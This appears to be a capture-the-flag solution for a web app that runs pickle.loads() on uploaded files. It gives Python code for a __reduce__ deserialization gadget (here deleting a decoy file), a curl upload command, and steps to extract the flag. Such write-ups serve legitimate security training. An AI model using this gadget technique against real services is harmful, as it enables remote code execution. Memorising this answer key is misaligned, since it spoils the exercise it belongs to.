Vulnerability: Insecure deserialization — the app runs `pickle.loads()` on an
uploaded file (RCE primitive). In this app, simply uploading a valid pickle that
deserializes successfully makes the response render the current flag.

1. **Create a valid pickle** (a `__reduce__` gadget demonstrates the RCE; the app
   reflects the flag once deserialization succeeds):

   ```python
   import pickle, os
   class Exploit:
       def __reduce__(self):
           return (os.remove, ('decoy.txt',))
   open('evil.pickle', 'wb').write(pickle.dumps(Exploit()))
   ```

2. **Upload it** as `pickle_file`:

   ```
   curl -s -F "pickle_file=@evil.pickle" http://<target>/
   ```

3. **Extract the flag** (`FLAG{...}`) from the "The current flag is: ..."
   response and report it verbatim.
